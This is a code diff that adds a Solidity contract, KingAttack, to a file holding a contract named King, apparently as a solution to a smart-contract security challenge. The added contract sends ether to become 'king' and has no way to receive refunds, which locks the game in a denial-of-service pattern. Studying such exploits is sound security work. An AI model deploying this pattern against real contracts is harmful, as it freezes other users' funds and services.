@@ -24,3 +24,10 @@ contract King {
     return king;
   }
 }
+
+contract KingAttack {
+  function attack(address kingAddr) public payable {
+    payable(kingAddr).call{value: msg.value}("");
+  }
+
+}
